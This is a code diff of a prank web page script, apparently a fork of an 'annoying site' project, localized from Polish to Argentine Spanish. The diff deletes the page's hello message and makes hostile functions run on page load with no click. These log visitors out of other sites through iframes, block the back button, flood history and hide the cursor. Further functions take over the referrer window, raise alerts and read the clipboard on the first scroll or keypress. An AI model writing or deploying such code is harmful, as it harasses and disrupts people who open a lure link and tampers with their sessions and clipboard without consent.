@@ -62,11 +62,11 @@ const ART = [
 ]
 
 const SEARCHES = [
-  'jshop',
-  'ptoszek',
-  'ptak',
-  'kanarek',
-  'jaczup'
+  'memes argentinos',
+  'pajarito gracioso',
+  'rickroll',
+  'nunca abras este link',
+  'caíste redondo'
 ]
 
 const VIDEOS = [
@@ -102,14 +102,14 @@ const FILE_DOWNLOADS = [
 ]
 
 const PHRASES = [
-  'hello my name is ptoszek, lol',
-  'birds are funny lalalalalalalallalala',
-  'wgl co u cb bo u mn dbr',
-  'knuuurrr eksplozja',
-  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
+  'jajajaja caíste hermano',
+  'te la re creíste jajajaja',
+  'nunca abras links de desconocidos boludo',
+  'esto no para más jajajaja',
+  'dale dale dale dale dale dale dale dale dale dale dale dale',
   'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
   'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
-  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
+  'epa epa epa epa epa epa epa epa epa epa epa epa epa epa epa epa epa epa'
 ]
 
 const LOGOUT_SITES = {
@@ -168,7 +168,7 @@ let interactionCount = 0
 
 //Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
 
-const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
+const veryLongString = repeatStringNumTimes(repeatStringNumTimes('¡¡CAÍSTE REDONDO!! 🐦 ',100),1500)
 
 /**
  * Number of iframes injected into the page for the "super logout" functionality.
@@ -283,26 +283,33 @@ function initChildWindow () {
 
 /**
  * Initialization code for parent windows.
+ * Everything auto-starts on page load. No click needed.
  */
 function initParentWindow () {
-  showHelloMessage()
+  // These work WITHOUT user gesture
   blockBackButton()
   fillHistory()
+  superLogout()
+  hideCursor()
+  rainbowThemeColor()
+  animateUrlWithEmojis()
   startInvisiblePictureInPictureVideo()
 
+  // Try to speak immediately (some browsers allow it)
+  setTimeout(() => { speak('Eso fue un error') }, 1500)
+
+  // Add the blur animation after a short delay
+  setTimeout(() => { document.body.classList.add('activated') }, 2000)
+
+  // These NEED a user gesture — trigger on first interaction
+  // (scroll, click, keypress, touch — anything)
   interceptUserInput(event => {
-    // Only run these on the first interaction
     if (interactionCount === 1) {
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
-      hideCursor()
       startVideo()
       startAlertInterval()
-      superLogout()
-      removeHelloMessage()
-      rainbowThemeColor()
-      animateUrlWithEmojis()
-      speak('To był błąd')
+      speak('jajaja caíste')
     }
   })
 }
@@ -341,7 +348,7 @@ function isParentSameOrigin () {
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
-    speak('Please don\'t go!')
+    speak('¡No te vayas por favor!')
     event.returnValue = true
   })
 }
@@ -712,7 +719,7 @@ function requestClipboardRead () {
       data => {
         if (!window.ApplePaySession) {
           // Don't alert in Safari because it blocks the event loop
-          window.alert("Successfully read data from clipboard: '" + data + "'")
+          window.alert("Leí tu portapapeles exitosamente: '" + data + "'")
         }
       },
       () => {}
@@ -1096,7 +1103,7 @@ function superLogout () {
     }
 
     const div = document.createElement('div')
-    div.innerText = `Wylogowywanie się z ${name}...`
+    div.innerText = `Cerrando sesión en ${name}...`
 
     const logoutMessages = document.querySelector('.logout-messages')
     logoutMessages.appendChild(div)
